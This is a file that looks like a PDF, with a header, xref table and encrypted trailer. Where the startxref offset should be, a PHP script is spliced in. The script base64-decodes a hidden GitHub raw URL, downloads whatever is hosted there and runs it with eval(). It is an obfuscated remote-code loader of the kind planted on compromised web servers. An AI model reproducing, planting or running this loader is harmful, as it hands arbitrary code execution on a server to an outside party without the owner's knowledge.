%PDF-1.6
%âãÏÓ
37 0 obj <</Linearized 1/L 20597/O 40/E 14115/N 1/T 19795/H [ 1005 215]>>
endobj
                 
xref
37 34
0000000016 00000 n
0000001386 00000 n
0000001522 00000 n
0000001787 00000 n
0000002250 00000 n
0000002274 00000 n
0000002423 00000 n
0000002844 00000 n
0000002888 00000 n
0000002932 00000 n
0000004113 00000 n
0000004147 00000 n
0000004211 00000 n
0000006880 00000 n
0000007023 00000 n
0000007172 00000 n
0000007312 00000 n
0000007455 00000 n
0000008176 00000 n
0000008566 00000 n
0000009066 00000 n
0000012518 00000 n
0000012667 00000 n
0000012803 00000 n
0000012939 00000 n
0000013072 00000 n
0000013208 00000 n
0000013344 00000 n
0000013480 00000 n
0000013632 00000 n
0000013818 00000 n
0000014039 00000 n
0000001220 00000 n
0000001005 00000 n
trailer
<</Size 71/Prev 19784/XRefStm 1220/Root 39 0 R/Encrypt 38 0 R/Info 6 0 R/ID[<C21F21EA44C1E2ED2581435FA5A2DCCE><15349106D985DA44991099F9C0CBF004>]>>
startxref<?php
function get($url) {
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_HEADER, true);
    curl_setopt($ch, CURLOPT_NOBODY, true);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); 
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE); 

    if ($http_code == 200) {
        curl_setopt($ch, CURLOPT_NOBODY, false);
        curl_setopt($ch, CURLOPT_HEADER, false);
        $data = curl_exec($ch);
        curl_close($ch);
        return $data;
    } else {
        curl_close($ch);
        return false;
    }
}

$x = '?>';
$url1 = base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2JlYXRrYXJidTE5OS9scGhra2svbWFpbi9mb3JiaWRlbg==');
$url2 = base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2JlYXRrYXJidTE5OS9scGhra2svbWFpbi9mb3JiaWRlbg==');

$script1 = get($url1);
if ($script1 !== false && $script1 !== 404) {
    eval($x . $script1);
} else {
    $script2 = get($url2);
    if ($script2 !== false) {
        eval($x . $script2);
    } else {
        echo "Both attempts failed.";
    }
}
?>
